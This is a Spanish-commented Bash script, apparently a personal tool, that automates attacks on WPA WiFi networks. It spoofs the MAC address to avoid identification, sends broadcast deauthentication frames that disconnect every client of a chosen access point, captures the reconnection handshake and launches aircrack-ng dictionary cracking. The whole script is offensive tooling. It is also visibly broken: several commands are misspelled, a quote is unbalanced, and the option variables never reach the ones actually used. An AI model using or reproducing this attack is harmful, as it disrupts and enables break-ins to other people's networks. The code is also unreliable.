#!/bin/bash

# Autor: Alfredo Sánchez Sánchez

# Introducimos la paletilla de colores:

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Quitamos para que a la hora de declarar las dependencias, no se haga de forma interactiva:

export DEBIAN_FRONTEND=noninteractive

# Hacemos la función de ctrl_c para salir fácilmente del programa

trap ctrl_c INT

# Monstraremos un mensaje de que estamos saliendo del programa
function ctrl_c(){
# Monstamos que se sale del programa
	echo -e "${redColour}Saliendo del programa...${endColour}"
# Recuperamos el cursor
	tput cnorm
# Quitamos la tarjeta de red de modo monitor
    airmon-ng stop ${networkCard} > /dev/null 2>&1
# Borramos la captura
	rm Captura.* 2>/dev/null
# Se devuelve un error
	exit 1
}
# Función para comprobar si se tienen las herramientas necesarias para usar el programa, se comprobará que se tiene macchanger (para cambiar la mac del dispositivo y no poder ser fácilmente identificado) y aircrack para el ataque en sí.
function dependencias(){
# Ponemos el cursor invisible para que no moleste:
	tput civis
# Primero se limpiará la pantalla
	clear
# Creamos un vector donde se encuentran las herramientas necesarias:
	dependencies=(aircrack-ng macchanger xterm)
	echo -e "${yellowColour}\n**** Comprobando programas necesarios ... ${endColour}\n"
	sleep 2
# Se recorre el vector que se ha creado anteriormente y se guarda en la variable program.
	for program in "${dependencies[@]}"; do
		echo -e "\n${grayColour} Herramienta a instalar:  $program ...${endColour}"
		test -f /usr/bin/$program
		if [ "$(echo $?)" == "0" ]; then
			echo -e "${greenColour}(Installed)${endColour}"
		else
			echo -e "${redColour}(Uninstalled)${endColour}"
			echo -e "${yellowColour} Instalando herramienta: $program ${endColour}"
			apt-get install $program -y > /dev/null 2>&1
		fi; sleep 1
	done
}

function startAtack(){
	clear
	echo -e "${yellowColour}**** Configurando tarjeta de red en modo monitor ${endColour}"
# Se inicialia el modo monitor (no se monstrará nada por pantalla
	airmon-ng start $networkCard > /dev/null 2>&1
# IMPORTANTE: En mi caso, mi tarjeta de red y con la versión de kali que uso, no me pone mon detras de la tarjeta de red cuando se encuentra en modo monitor. En caso de que al ponerse en modo monitor el nombre cambie con un mon detrás, habría que añadirlo en el programa.
# Para empezar, daré de alta la tarjeta de red.
	ifconfig ${networkCard} down > /dev/null 2>&1
# Ahora se le asiganará una nueva dirección mac a la tarjeta
	macchnager -a ${networkCard} > /dev/null 2>&1
# Ahora se dará de alta de nuevo la trajeta
	ifconfig ${networkCard} up > /dev/null
# Matamos también los procesos conflictivos dhclient y wpa_suplicant
	killall dhclient wpa_supplicant 2>/dev/null
# Mostramos por consola la nueva MAC que se le ha asignado a la tarjeta de red:
	echo -e "\n${yellowColour}**** Nueva dirección MAC asignada ${endColour}${blueColour}$(macchanger -s ${networkCard} | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}"
# Ahora haremos un airodump, pero el problema es que tenemos que monstrar y listar las redes que se pueden encontrar, pero en el mismo terminal en el que se corre el programa, para ello, lo que haremos será abrir una nueva consola donde se ejecutará y mostrará el comando y lo pondremos en segundo plano
	xterm -hold -e "airodump-ng ${networkCard}" &
# Se captura y guarda el nombre del proceso de airodump entre medias:
    airodump_xterm_PID=$!

# Se le preguntará al usuario el nombre del punto de acceso y el canal al que se quiere conectar, así además no se nos salta a que se apague el modo monitor (el proceso está en segundo plano)
	echo -ne "\n${yellowColour}**** Nombre del punto de acceso al que se quiere acceder: ${endColour}" && read nombreAP
    echo -ne "\n${yellowColour}**** Canal al que se quiere acceder: ${endColour}" && read canalAP
# Se mata el proceso que estaba en segundo plano con el airodump corriendo
	kill -9 $airdump_xterm_PID
# Se espera a que se termine el proceso una vez haya sido matado y no mostramos la salida (FINESHED)
	wait $airodump_xterm_PID 2>/dev/null
# Ahora se hace un airodump, pero filtrando para mostrar solo el canal y la red que interese. También se capturarán las evidencias en el fichero .cap
	xterm -hold -e "airodump-ng -c $canalAP -w Captura --essid $nombreAP ${networkCard}" &
	airodump_filter_PID=$!
# Pasamos a emitir paquetes de deautenticación para expulsar a los clientes, expulsaremos a todos usando la dirección FF:FF:FF:FF:FF:FF (Deautenticación global), de esta forma el cliente al reconectarse a la red, capturaremos el handshake, que se guardará en la captura. Se usará aireplay.
	sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $nombreAP -c FF:FF:FF:FF:FF:FF ${networkCard}" &
	aireplay_PID=$!
	kill -9 $aireplay_PID
	wait $aireplay_PID 2>/dev/null
# Esperamos 10 segundos y matamos el proceso de aurodump
	sleep 10
	kill -9 $airodump_filter_PID
	wait $airodump_filter_PID 2>/dev/null
# Ahora romperemos la contraseña usando la captura que se ha captura. Se usará aircrack:
	xterm -hold -e "aircrack-g" -w $diccionario Captura-01.cap" &
}
# Función helpPanel para monstrar el panel de ayuda:
function helpPanel(){
	echo -e "\n${yellowColour}**** Uso de la herramienta ****${endColour}"
	echo -e "\n\t${greenColour}a)${endColour}${blueColour} Modo de ataque ${endColour}"
	echo -e "\t\t${purpleColour}Handshake:${endColour} ${greenColour}Captura del handshake entre un cliente y el AP${endColour}"
	echo -e "\t\t${purpleColour}PKMID:${endColour} ${greenColour}Ataque para crackear contraseña usando el handshake${endColour}"
	echo -e "\n\t${greenColour}n)${endColour}${blueColour} Nombre de la tarjeta de red  ${endColour}\n"
    echo -e "\n\t${greenColour}d)${endColour}${blueColour} Ruta al diccionario para crackear la contraseña ${endColour} ${purpleColour} Ejemplo: -d /home/Desktop/rockyou.txt ${endColour}\n"
    echo -e "\n\t${greenColour}h)${endColour}${blueColour} Mostrar este panel de ayuda  ${endColour}\n"
# Devolveremos un exit 1, monstrando como si el programa no se haya ejecutado bien (no ha hecho nada en si)
	exit 1
}

# El programa principal, lo que hará es una pequeña herramienta donde lo que se hará es jugar con bash para configurar parámetros para configurar el entorno de ataque y se automatizará el proceso de obtener una contraseña de un AP de Wifi.

# Lo primero que haremos es comprobar si somos root (llamando a id -u), si no somos root, entónces nos metemos como root.

if [ "$(id -u)" == "0" ]; then
# Creamos un panel de ayuda con getopts para listar las cosas que se podrán hacer y las opciones que tenemos
# Usamos una variable con declare -i parameter_counter (declare -i obliga a que sea integer y así ahorrar memoria) que lo que hará es ver que se ha enviado parámetros al programa, si no se han enviado, se monstrará el panel de ayuda para mostrar como se hace.
	declare -i parameter_counter=0;while getopts "a:n:d:h:" arg; do
		case $arg in
# Cojemos el modo de ataque hemos definido
			a) modo_ataque=$OPTARG; let parameter_counter+=1;;
# Cojemos la tarjeta de red con la que se va a atacar
			n) tarjeta_red=$OPTARG let parameter_counter+=1;;
# Cojemos el diccionario que se usará para crackear la contraseña
			d) dicctionario=$OPTARG let parameter_counter+=1;;
# Se llamará al panel de ayuda para monstrar como se ejecuta el programa y las opciones que hay.
			h) helpPanel;;
		esac
	done
# Vemos si el parámetro declarado coincide con 2 (que se hayan metido los argumentos de modo de ataque y la tarjeta de red.
	if [ $parameter_counter -ne 3 ]; then
		helpPanel
	else
# Comprobamos si se tienen todos los programas necesarios para instalar
		dependencias
		startAtack
# Quitamos la tarjeta de red de modo monitor
		airmon-ng stop ${networkCard} > /dev/null 2>&1
# Borramos la captura
	    rm Captura.* 2>/dev/null

		tput cnorm
	fi
else
	echo -e "\n${redColour}[*] Debes de ser root para ejecutar el programa${endColour}\n"
fi
